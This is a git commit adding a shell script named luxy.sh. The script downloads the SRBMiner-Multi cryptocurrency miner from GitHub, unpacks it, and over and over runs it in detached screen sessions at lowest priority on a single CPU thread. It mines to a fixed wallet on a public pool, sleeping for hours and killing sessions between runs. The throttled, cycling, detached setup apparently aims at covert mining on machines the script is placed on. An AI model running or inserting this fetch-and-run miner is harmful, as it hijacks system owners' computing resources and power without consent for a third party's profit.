0b50efd8b567fe49ae6ae7a00d1869821598fa90
bibirbusin <132418678+bibirbusin@users.noreply.github.com>
2024-03-27 11:51:52 +0700

    Create luxy.sh

---
+++ bitnet/luxy.sh
@@ -0,0 +1,245 @@
+#!/bin/bash
+
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.9/SRBMiner-Multi-2-4-9-Linux.tar.gz
+tar -xvf SRBMiner-Multi-2-4-9-Linux.tar.gz
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 7200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 5
+screen -d -m nice -n 19 ./SRBMiner-Multi-2-4-9/SRBMiner-MULTI --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet bit1qad3ymf58czx854hzh86c5wl0u7t3k06mlv8nwj.luxy$RANDOM --password x --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
